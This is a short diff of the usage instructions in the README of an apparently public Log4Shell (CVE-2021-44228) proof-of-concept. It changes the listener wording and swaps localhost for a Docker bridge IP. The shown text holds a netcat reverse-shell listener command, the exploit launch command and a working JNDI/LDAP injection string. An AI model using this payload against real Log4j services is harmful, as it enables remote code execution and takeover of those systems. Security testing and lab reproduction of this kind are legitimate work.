@@ -38,14 +38,14 @@ pip install -r requirements.txt
 #### Usage:
 
 
-* Start a netcat listener to accept reverse shell connection.<br>
+* Start a pwncat listener to accept reverse shell connection.<br>
 ```py
 nc -lvnp 9001
 ```
 * Launch the exploit.<br>
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
 ```py
-$ python3 poc.py --userip localhost --webport 8000 --lport 9001
+$ python3 poc.py --userip 172.17.0.1 --webport 8000 --lport 9001
 
 [!] CVE: CVE-2021-44228
 [!] Github repo: https://github.com/kozmer/log4j-shell-poc
@@ -53,7 +53,7 @@ $ python3 poc.py --userip localhost --webport 8000 --lport 9001
 [+] Exploit java class created success
 [+] Setting up fake LDAP server
 
-[+] Send me: ${jndi:ldap://localhost:1389/a}
+[+] Send me: ${jndi:ldap://172.17.0.1:1389/a}
 
 Listening on 0.0.0.0:1389
 ```
